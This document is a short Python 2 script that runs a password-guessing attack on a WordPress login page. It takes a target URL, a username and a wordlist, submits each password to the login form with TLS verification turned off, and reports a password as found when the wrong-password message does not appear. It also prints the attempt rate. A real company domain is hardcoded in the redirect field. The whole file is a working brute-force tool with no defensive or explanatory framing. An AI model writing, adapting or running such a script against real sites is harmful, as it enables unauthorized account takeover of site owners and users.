import requests
import subprocess
import sys
import re
import time

url = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]
username_field = "log"
password_field = "pwd"
start_time = int(time.time())

i = 0
f = open(wordlist,'r')

cookies = dict(wordpress_test_cookie='WP+Cookie+check')

for password in f:

	try:
		password = password.strip()
		payload = {username_field: user,password_field: password,"testcookie":"1","redirect_to":"http://www.532corp.com/wp-admin/"}
		#cookies = r.cookies
		r = requests.post(url, data=payload, verify=False,cookies=cookies)
		#print r.text
		if("This user does not exist" in str(r.text)):
			print "Error: User doesn't exist"
			break
		if("The password you entered for the username" not in str(r.text)):
			#print str(r.text)
			print "Found Password("+user+"): "+password
			break
	except:
		print "Error with: "+url
		break
	i += 1
	if(i % 100 == 0):
		print str(i)+" attempts"
		print str(i / (int(time.time())-start_time))+" attempts/second"
		start_time = int(time.time())
